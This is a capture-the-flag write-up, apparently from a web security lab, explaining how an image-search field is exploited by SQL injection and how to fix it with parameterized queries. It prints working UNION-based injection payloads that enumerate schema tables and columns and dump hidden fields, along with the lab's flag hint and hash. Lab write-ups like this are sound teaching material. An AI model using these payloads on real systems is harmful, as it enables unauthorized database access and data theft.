## 7- SQL INJECTION SEARCH IMAGE
### How to reproduce :
if we put `1 OR 0=0` in the images search we can see the all images.
so we can use this query to list all columns in all tables
`0 OR 0=0 UNION SELECT TABLE_NAME,COLUMN_NAME FROM information_schema.columns`
now we know the name images table and name of the other columns in images table
now with this query we can get the content of the other columns in images table
`0 OR 0=0 UNION SELECT title,comment FROM list_images`
we found this value in one of the columns
`If you read this just use this md5 decode lowercase then sha256 to win this flag ! : 1928e8083cf461a51303633093573c46`
we decode it and encode it like what they said and we get the flag
### How to Fix :
We should prepare the query before executing it or use parametrized queries or use Input validation.
Or use a tool like PDO in php or entity framework in .NET
